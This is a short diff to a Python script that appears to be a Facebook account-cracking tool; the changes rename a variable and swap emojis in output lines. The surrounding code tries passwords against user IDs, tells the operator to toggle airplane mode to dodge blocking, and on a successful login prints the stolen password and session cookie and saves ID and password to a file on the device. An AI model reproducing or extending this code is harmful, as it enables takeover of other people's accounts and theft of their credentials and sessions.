@@ -162,7 +162,7 @@ def xxr():
         clear()
         tl = str(len(user))
         print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-	    print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mSIM CODE : \033[1;97m'+kode)
+	    print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mSIM CODE : \033[1;97m'+code)
 	    print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mTOTAL IDS : \033[1;92m'+tl)
 	    print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mUSE \033[1;34m[\033[1;32mDATA\033[1;97m/\033[38;5;196mWIFI\033[1;34m] ')
 	    print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE ')
@@ -217,7 +217,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[NAYANOK💥] ' +uid+ ' | ' +ps+    '  \n[‎‎💣]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[NAYANOK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/NAYAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
